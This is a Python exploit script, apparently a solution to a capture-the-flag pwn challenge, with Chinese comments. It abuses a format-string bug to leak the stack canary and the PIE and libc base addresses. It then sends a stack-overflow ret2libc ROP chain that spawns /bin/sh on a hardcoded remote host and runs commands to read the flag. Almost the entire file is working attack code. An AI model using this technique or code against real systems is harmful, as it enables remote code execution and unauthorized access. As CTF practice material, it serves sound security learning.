#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""fmtstack —— 格式化字符串泄露 canary/PIE/libc + 栈溢出 ret2libc（纯标准库，socket）

附件: attachments/pwn（amd64，PIE + canary + NX + Full RELRO，未 strip）
      attachments/libc.so.6

交互:
  `name: ` -> 名字被直接塞给 printf，可控格式串：
      %23$p   -> canary
      %25$p   -> 返回地址（PIE）  base = leak - 0x1281
      %29$p   -> 返回地址（libc）  base = leak - 0x2a601
  `msg: `  -> read 栈缓冲区，偏移 72，canary 后 8 字节，再 ROP：
      pop_rdi(libc+0x11b9fa) + "/bin/sh"(libc+0x1db799) + ret(libc+0x289fe) + system(libc+0x5c2e0)

用法:
  python exp.py                 # 默认 219.216.64.241:35053
  python exp.py HOST PORT
"""
import re
import select
import socket
import struct
import sys
import time

HOST, PORT = "219.216.64.241", 35053
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])

PIE_RET = 0x1281
LIBC_RET = 0x2A601
POP_RDI = 0x11B9FA
RET = 0x289FE
SYSTEM = 0x5C2E0
BINSH = 0x1DB799
OFFSET = 72

FLAG_RE = re.compile(rb"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")
p64 = lambda x: struct.pack("<Q", x)


class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=5)
        self.s.setblocking(False)
        self.buf = b""

    def read_until(self, token, timeout=5):
        end = time.time() + timeout
        while token not in self.buf and time.time() < end:
            r, _, _ = select.select([self.s], [], [], 0.2)
            if r:
                d = self.s.recv(4096)
                if not d:
                    break
                self.buf += d
        i = self.buf.find(token)
        if i < 0:
            out, self.buf = self.buf, b""
            return out
        out = self.buf[: i + len(token)]
        self.buf = self.buf[i + len(token):]
        return out

    def read_for(self, sec):
        end = time.time() + sec
        out = b""
        while time.time() < end:
            r, _, _ = select.select([self.s], [], [], 0.2)
            if r:
                d = self.s.recv(4096)
                if not d:
                    break
                out += d
        return out

    def send(self, data):
        self.s.sendall(data)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def main():
    t = Tube(HOST, PORT)
    t.read_until(b"name: ")
    t.send(b"%23$p.%25$p.%29$p\n\x00\n")

    leak_line = t.read_until(b"msg: ")
    m = re.search(rb"(0x[0-9a-f]+)\.(0x[0-9a-f]+)\.(0x[0-9a-f]+)", leak_line)
    if not m:
        print("[-] 没解析到泄露:", repr(leak_line))
        return 1
    canary, pie_leak, libc_leak = (int(x, 16) for x in m.groups())
    pie_base = pie_leak - PIE_RET
    libc_base = libc_leak - LIBC_RET
    print("[*] canary    = %#x" % canary)
    print("[*] pie leak  = %#x -> base %#x" % (pie_leak, pie_base))
    print("[*] libc leak = %#x -> base %#x" % (libc_leak, libc_base))

    payload = (
        b"A" * OFFSET
        + p64(canary)
        + b"A" * 8
        + p64(POP_RDI + libc_base)
        + p64(BINSH + libc_base)
        + p64(RET + libc_base)
        + p64(SYSTEM + libc_base)
    )
    print("[*] payload %d bytes" % len(payload))
    t.send(payload + b"\n")

    time.sleep(0.4)
    t.send(b"echo PWNED; id; pwd; ls -la; cat ./flag 2>/dev/null; cat /flag 2>/dev/null; echo ---DONE---\n")
    out = t.read_for(4)
    print("[*] output:\n" + out.decode("utf-8", "replace")[:1500])

    fm = FLAG_RE.search(out)
    if fm:
        print("[+] FLAG:", fm.group(0).decode())
        t.close()
        return 0
    print("[-] 未取到 flag")
    t.close()
    return 1


if __name__ == "__main__":
    sys.exit(main())
